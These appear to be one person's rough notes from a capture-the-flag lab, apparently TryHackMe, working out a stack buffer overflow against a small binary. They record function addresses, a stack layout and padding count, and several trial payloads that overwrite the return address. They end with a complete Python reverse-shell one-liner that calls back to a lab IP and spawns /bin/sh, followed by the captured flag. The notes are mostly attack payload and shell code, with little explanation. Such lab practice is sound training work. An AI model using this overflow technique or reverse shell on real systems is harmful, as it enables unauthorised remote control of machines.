## Tristan Gomez

Vuln() -> 0x00000000 00400686

Main() -> 0x004006c3
 * has scanf to fill 32char buffer?
 * Smash stack to overwrite 


-----------
ret_addr     RBP + 8
-----------
Saved RBP    RBP
-----------
local_28 [32] RBP - 8

32 (a) + 8 + 8(hex addr to vuln)

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbb 86064000 00000000x0
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb8606400000000000x0
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb0x0000000000400686

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0x000000400686
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0x000000e5894855
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0x0000005584985e
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0x00400686

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x86\x06@\x00\x00\x00\x00\x00
\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x86\x06@\x00\x00\x00\x00\x00

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.248.108",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
THM{PWN_1S_V3RY_E4SY}
